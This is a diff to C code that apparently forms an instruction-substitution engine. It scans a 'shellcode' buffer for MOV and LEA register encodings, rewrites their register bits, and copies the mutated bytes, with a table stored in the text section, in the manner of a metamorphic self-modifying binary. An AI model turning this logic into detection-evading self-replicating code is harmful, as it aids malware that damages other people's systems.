@@ -658,42 +658,72 @@ static int8_t getRandomNbr(int8_t max) {
 
 static void updateRegisters(unsigned char *ins, unsigned char *pointer, unsigned char *shellcode, unsigned char *bin, size_t *binSize) {
   size_t  i;
+  size_t  j;
 
-  i = 0;
-  while (*ins != 0x42) {
-    if (*ins == 0) {
-      ins += 1;
+  j = 0;
+  while (pointer[j] != 0x42) {
+    if (pointer[j] == 0) {
+      j += 1;
       *binSize += 1;
       continue ;
     }
     i = 0;
-    while (pointer[i] != 0x42) {
-      if (((*ins & 0x1) == 0x1 && (pointer[i] & 0x1) == 0x1) ||
-          (*ins & 0x4) == 0x4 && (pointer[i] & 0x4) == 0x4)
+    while (ins[i] != 0x42) {
+      if (((pointer[j] & 0x1) == 0x1 && (ins[i] & 0x1) == 0x1) ||
+          (pointer[j] & 0x4) == 0x4 && (ins[i] & 0x4) == 0x4)
         bin[*binSize] |= (shellcode[i] & 0x7);
-      if ((*ins & 0x1) == 0x1 && (pointer[i] & 0x8) == 0x8 ||
-          (*ins & 0x4) == 0x4 && (pointer[i] & 0x20) == 0x20)
+      if ((pointer[j] & 0x1) == 0x1 && (ins[i] & 0x8) == 0x8 ||
+          (pointer[j] & 0x4) == 0x4 && (ins[i] & 0x20) == 0x20)
         bin[*binSize] |= ((shellcode[i] >> 3) & 0x7);
-      if ((*ins & 0x8) == 0x8 && (pointer[i] & 0x1) == 0x1 ||
-          (*ins & 0x20) == 0x20 && (pointer[i] & 0x4) == 0x4)
+      if ((pointer[j] & 0x8) == 0x8 && (ins[i] & 0x1) == 0x1 ||
+          (pointer[j] & 0x20) == 0x20 && (ins[i] & 0x4) == 0x4)
         bin[*binSize] |= ((shellcode[i] << 3) & 0x38);
-      if ((*ins & 0x8) == 0x8 && (pointer[i] & 0x8) == 0x8 ||
-          (*ins & 0x20) == 0x20 && (pointer[i] & 0x20) == 0x20)
+      if ((pointer[j] & 0x8) == 0x8 && (ins[i] & 0x8) == 0x8 ||
+          (pointer[j] & 0x20) == 0x20 && (ins[i] & 0x20) == 0x20)
         bin[*binSize] |= (shellcode[i] & 0x38);
       i += 1;
     }
     *binSize += 1;
-    ins += 1;
+    j += 1;
+  }
+}
+
+static void checkInstruction(unsigned char *ins, unsigned char *shellcode, size_t *i) {
+  unsigned char *order;
+  unsigned char *suffix;
+
+  order = ins;
+  while (*order != 0x42)
+    order += 1;
+  order += 1;
+  suffix = order;
+  while (*suffix != 0x42)
+    suffix += 1;
+  suffix += 1;
+  *i = 0;
+  while (ins[*i] != 0x42 &&
+        (shellcode[*i] == ins[*i] ||
+        (ins[*i] == 0x41 && (shellcode[*i] & suffix[*i]) == suffix[*i]))) {
+    if (ins[*i] == 0x41) {
+      if ((order[*i] & 0x1) == 0x1 || (order[*i] & 0x4) == 0x4) {
+        if ((shellcode[*i] & 0x7) == (0x4 << 3) || (shellcode[*i] & 0x7) == (0x5 << 3))
+          break ;
+      }
+      if ((order[*i] & 0x8) == 0x8 || (order[*i] & 0x20) == 0x20) {
+        if ((shellcode[*i] & 0x38) == (0x4 << 3) || (shellcode[*i] & 0x38) == (0x5 << 3))
+          break ;
+      }
+    }
+    *i += 1;
   }
 }
 
 /* Source operand = 0b001 - Destination operand = 0b100 */
 const char  instructions[][MAX_INS_SIZE] __attribute__ ((section (".text#"))) = {
-  // TODO Add 0xc0 dynamically on the left
-  "\x48\x89\xc0\x42\x00\x00\x0c\x42", // MOV r/m64,r64
-  "\x48\x8d\x00\x42\x00\x00\x21\x42", // LEA r/m64,r64
+  "\x48\x89\x41\x42\x00\x00\x0c\x42\x00\x00\xc0\x42", // MOV r/m64,r64
+  "\x48\x8d\x41\x42\x00\x00\x21\x42\x00\x00\x00\x42", // LEA r/m64,r64
   "\x42",
-  /* "\x50\x58\x90\x42\x04\x01\x00\x42", // PUSH r64, POP r64 */
+  /* "\x41\x41\x90\x42\x01\x04\x00\x42\x50\x58\x00\x42", // PUSH r64, POP r64 */
   /* "\x91\x90\x48\x31\xdb\x90\x90\x42", // xor rbx ,rbx */
   /* "\xb8\x41\x00\x00\x00\x42", */
   /* "\x48\xc7\xc0\x00\x00\x00\x00\x42\x00\x00\x21\x00\x00\x00\x00\x42", // MOV r64, 0x0 */
@@ -718,9 +748,7 @@ static void  copyModifiedCode(struct bfile *new, size_t binSize, size_t size) {
   while (i < size) {
     ins = (void *)copyModifiedCode - sizeof(instructions);
     while (ins != (void *)copyModifiedCode) {
-      j = 0;
-      while (ins[j] != 0x42 && (shellcode[i + j] == ins[j] || (ins[j] == 0xc0 && (shellcode[i + j] & 0x7) != 0x4 && (shellcode[i + j] & 0x7) != 0x5 && (shellcode[i + j] & 0xc0) == 0xc0)))
-        j += 1;
+      checkInstruction(ins, shellcode + i, &j);
       if (ins[j] != 0x42 ||
   ((void *)(shellcode + i) >= (void *)copyModifiedCode - sizeof(instructions) && (void *)(shellcode + i) < (void *)copyModifiedCode)) {
         ins += MAX_INS_SIZE;
@@ -743,7 +771,11 @@ static void  copyModifiedCode(struct bfile *new, size_t binSize, size_t size) {
         ins += MAX_INS_SIZE;
       k = 0;
       while (ins[k] != 0x42) {
-        bin[binSize] = ins[k];
+        if (ins[k] == 0x41)
+          // TODO Remove + 8
+          bin[binSize] = ins[k + 8];
+        else
+          bin[binSize] = ins[k];
         binSize += 1;
         k += 1;
       }
